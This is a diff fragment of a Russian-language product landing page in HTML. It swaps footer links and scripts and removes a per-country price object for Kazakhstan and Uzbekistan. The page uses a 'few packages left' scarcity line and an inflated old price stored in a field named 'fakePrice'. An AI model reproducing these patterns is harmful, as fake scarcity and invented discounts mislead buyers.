+<input type="hidden" name="10ea65fea89019ccb1c114e1e42868e9a56aed07" value="OWZiMWYyNGUwMzlhNjQyM2UyZDNmZjY0NGI3OTNmOWEyNzc=" />
+</form>
+                <div class="stock">Осталось <span>15</span> упаковок по акции</div>
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+        <div class="wrap">
+            <img src="assets_pages/copyrights/0/black-320.png" alt="copyright">
+    <a href="politics.html">Политика конфиденциальности</a>
+    <a href="agreement.html">Пользовательское соглашение</a>
+        </div>
+    </footer>
+
+    <script type="text/javascript">
+        var phonePrefix = '+7';
+    </script>
+    <script type="text/javascript" src="assets_pages/js/phonePrefix.js"></script>
 
 
 
-         
-      </div>
-      <link rel="stylesheet" href="css/owl.carousel.min.css">
-      <script src="js/owl.carousel.min.js"></script>
-      <script src="js/simpletimer.js"></script>
-      <script src="js/script.js"></script>
-   <script src="widgets/jquery.inputmask.bundle.js"></script><script src="widgets/phone.js"></script><script src="widgets/langs.js"></script>
-
-<script src='widgets/app.js'></script>
-<script>window.allPrices={"KZ":{"userId":null,"countryId":4,"code":"KZ","title":"\u041a\u0430\u0437\u0430\u0445\u0441\u0442\u0430\u043d","cost":5,"price":null,"oldPrice":9900,"fakePrice":9900,"currency":"\u20b8                   ","country":"KZ","type":3},"UZ":{"userId":null,"countryId":13,"code":"UZ","title":"\u0423\u0437\u0431\u0435\u043a\u0438\u0441\u0442\u0430\u043d","cost":19900,"price":null,"oldPrice":390000,"fakePrice":390000,"currency":"\u0441\u045e\u043c                 ","country":"UZ","type":3}}</script>
-<script>window.pageType='landing'</script>
-
-
-
-
-    <!-- vk counter -->
-    <!-- //vk counter -->
-
-
-<script>
-
-</script>
- </body>
+</body>
 </html>
